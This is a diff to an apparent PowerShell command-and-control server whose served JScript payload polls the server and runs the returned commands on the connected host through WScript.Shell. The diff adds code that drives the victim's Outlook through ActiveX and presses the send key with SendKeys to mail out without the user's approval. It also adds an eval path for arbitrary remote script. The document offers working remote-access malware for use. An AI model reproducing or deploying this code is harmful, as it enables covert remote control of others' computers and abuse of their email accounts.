@@ -15,6 +15,8 @@
 #>
 
 $Server = '127.0.0.1' #Listening IP. Change This.
+$EmailRecipient = "user@example.com"
+
 
 function Receive-Request {
    param(      
@@ -49,7 +51,40 @@ while ($true) {
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
      write-host "Host Connected" -fore Cyan
         $message = '
+					function stringStartsWith (string, prefix) {
+					return string.slice(0, prefix.length) == prefix;
+					}
 					
+					function SendMail(to,body,sub) {
+						var theApp    //Reference to Outlook.Application
+						var theMailItem   //Outlook.mailItem
+						//Attach Files to the email, Construct the Email including     
+						//To(address),subject,body
+						var subject = sub
+						var msg = body
+						//Create a object of Outlook.Application
+						try
+						{
+						var theApp = new ActiveXObject("Outlook.Application")
+						var theMailItem = theApp.CreateItem(0) // value 0 = MailItem
+						  //Bind the variables with the email
+						  theMailItem.to = to
+						  theMailItem.Subject = (subject);
+						  theMailItem.Body = (msg);
+						  
+						  //Show the mail before sending for review purpose
+						  //You can directly use the theMailItem.send() function
+						  //This Sends Email without Prompt. *grin*
+						  theMailItem.display();
+						  var Shell = new ActiveXObject( "WScript.Shell" ); 
+						  Shell.AppActivate("Outlook");
+						  Shell.SendKeys( "%s" );
+						  }
+						catch(err)
+						{
+
+						}
+					}
 					
 					while(true)
 					{
@@ -59,6 +94,8 @@ while ($true) {
 						h.Send();
 						c = h.ResponseText;
 						if(c == "sleep" || c=="") { for (var i=0;i<10000;i++){} continue; }
+						if(c == "mail") { SendMail("'+$EmailRecipient+'","Yup Its Alive","Important"); continue}
+						if(stringStartsWith(c,"#")){ while(c.charAt(0) == "#"){s=c.substr(1);eval(s);break;} continue;}
 						r = new ActiveXObject("WScript.Shell").Exec(c);
 						var so;
 						while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
